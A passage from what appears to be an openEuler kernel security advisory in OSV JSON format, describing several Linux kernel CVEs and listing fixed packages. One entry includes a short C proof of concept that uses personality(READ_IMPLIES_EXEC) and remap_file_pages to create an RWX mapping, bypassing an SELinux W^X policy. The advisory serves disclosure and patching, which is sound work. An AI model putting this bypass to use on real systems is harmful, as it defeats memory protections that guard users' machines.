And if the process has called personality(READ_IMPLIES_EXEC) before and remap_file_pages() is called for RW pages, this will actually result in remapping the pages to RWX, bypassing a W^X policy enforced by SELinux.  So we should check prot by security_mmap_file LSM hook in the remap_file_pages syscall handler before do_mmap() is called. Otherwise, it potentially permits an attacker to bypass a W^X policy enforced by SELinux.  The bypass is similar to CVE-2016-10044, which bypass the same thing via AIO and can be found in [1].  The PoC:  $ cat &gt; test.c  int main(void) {  size_t pagesz = sysconf(_SC_PAGE_SIZE);  int mfd = syscall(SYS_memfd_create, &quot;test&quot;, 0);  const char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE,   MAP_SHARED, mfd, 0);  unsigned int old = syscall(SYS_personality, 0xffffffff);  syscall(SYS_personality, READ_IMPLIES_EXEC | old);  syscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0);  syscall(SYS_personality, old);  // show the RWX page exists even if W^X policy is enforced  int fd = open(&quot;/proc/self/maps&quot;, O_RDONLY);  unsigned char buf2[1024];  while (1) {   int ret = read(fd, buf2, 1024);   if (ret &lt;= 0) break;   write(1, buf2, ret);  }  close(fd); }  $ gcc test.c -o test $ ./test | grep rwx 7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)  [PM: subject line tweaks](CVE-2024-47745)\r\n\r\nIn the Linux kernel, the following vulnerability has been resolved:  KVM: nSVM: Ignore nCR3[4:0] when loading PDPTEs from memory  Ignore nCR3[4:0] when loading PDPTEs from memory for nested SVM, as bits 4:0 of CR3 are ignored when PAE paging is used, and thus VMRUN doesn&apos;t enforce 32-byte alignment of nCR3.  In the absolute worst case scenario, failure to ignore bits 4:0 can result in an out-of-bounds read, e.g. if the target page is at the end of a memslot, and the VMM isn&apos;t using guard pages.  Per the APM:    The CR3 register points to the base address of the page-directory-pointer   table. The page-directory-pointer table is aligned on a 32-byte boundary,   with the low 5 address bits 4:0 assumed to be 0.  And the SDM&apos;s much more explicit:    4:0    Ignored  Note, KVM gets this right when loading PDPTRs, it&apos;s only the nSVM flow that is broken.(CVE-2024-50115)\r\n\r\nIn the Linux kernel, the following vulnerability has been resolved:  drm/amd: Guard against bad data for ATIF ACPI method  If a BIOS provides bad data in response to an ATIF method call this causes a NULL pointer dereference in the caller.  ``` ? show_regs (arch/x86/kernel/dumpstack.c:478 (discriminator 1)) ? __die (arch/x86/kernel/dumpstack.c:423 arch/x86/kernel/dumpstack.c:434) ? page_fault_oops (arch/x86/mm/fault.c:544 (discriminator 2) arch/x86/mm/fault.c:705 (discriminator 2)) ? do_user_addr_fault (arch/x86/mm/fault.c:440 (discriminator 1) arch/x86/mm/fault.c:1232 (discriminator 1)) ? acpi_ut_update_object_reference (drivers/acpi/acpica/utdelete.c:642) ? exc_page_fault (arch/x86/mm/fault.c:1542) ? asm_exc_page_fault (./arch/x86/include/asm/idtentry.h:623) ? amdgpu_atif_query_backlight_caps.constprop.0 (drivers/gpu/drm/amd/amdgpu/amdgpu_acpi.c:387 (discriminator 2)) amdgpu ? amdgpu_atif_query_backlight_caps.constprop.0 (drivers/gpu/drm/amd/amdgpu/amdgpu_acpi.c:386 (discriminator 1)) amdgpu ```  It has been encountered on at least one system, so guard for it.

As the man manual of clock_settime() said, if tp.tv_sec is negative or tp.tv_nsec is outside the range [0..999,999,999], it should return EINVAL, which include dynamic clocks which handles PTP clock, and the condition is consistent with timespec64_valid(). As Thomas suggested, timespec64_valid() only check the timespec is valid, but not ensure that the time is in a valid range, so check it ahead using timespec64_valid_strict() in pc_clock_settime() and return -EINVAL if not valid.  There are some drivers that use tp-&gt;tv_sec and tp-&gt;tv_nsec directly to write registers without validity checks and assume that the higher layer has checked it, which is dangerous and will benefit from this, such as hclge_ptp_settime(), igb_ptp_settime_i210(), _rcar_gen4_ptp_settime(), and some drivers can remove the checks of itself.(CVE-2024-50195)\r\n\r\nIn the Linux kernel, the following vulnerability has been resolved:  wifi: mac80211: do not pass a stopped vif to the driver in .get_txpower  Avoid potentially crashing in the driver because of uninitialized private data(CVE-2024-50237)","affected":[{"package":{"name":"kernel","ecosystem":"openEuler:20.03-LTS-SP4","purl":"pkg:rpm/openEuler/kernel&distro=openEuler-20.03-LTS-SP4"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"0"},{"fixed":"4.19.90-2411.4.0.0304.oe2003sp4"}]}],"ecosystem_specific":{"aarch64":["bpftool-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","bpftool-debuginfo-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","kernel-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","kernel-debuginfo-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","kernel-debugsource-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","kernel-devel-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","kernel-source-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","kernel-tools-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","kernel-tools-debuginfo-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","kernel-tools-devel-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","perf-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","perf-debuginfo-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","python2-perf-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","python2-perf-debuginfo-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","python3-perf-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm","python3-perf-debuginfo-4.19.90-2411.4.0.0304.oe2003sp4.aarch64.rpm"],"src":["kernel-4.19.90-2411.4.0.0304.oe2003sp4.src.rpm"],"x86_64":["bpftool-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","bpftool-debuginfo-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","kernel-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","kernel-debuginfo-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","kernel-debugsource-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","kernel-devel-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","kernel-source-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","kernel-tools-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","kernel-tools-debuginfo-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","kernel-tools-devel-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","perf-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","perf-debuginfo-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","python2-perf-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","python2-perf-debuginfo-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","python3-perf-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm","python3-perf-debuginfo-4.19.90-2411.4.0.0304.oe2003sp4.x86_64.rpm"]},"database_specific":{"source":"https://repo.openeuler.org/security/data/osv/OESA-2024-2449.json"}}],"references":[{"type":"ADVISORY","url":"https://www.openeuler.org/zh/security/security-bulletins/detail/?id=openEuler-SA-2024-2449"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-47745"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-50115"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-50117"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-50195"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2024-50237"}],"database_specific":{"severity":"High"}}
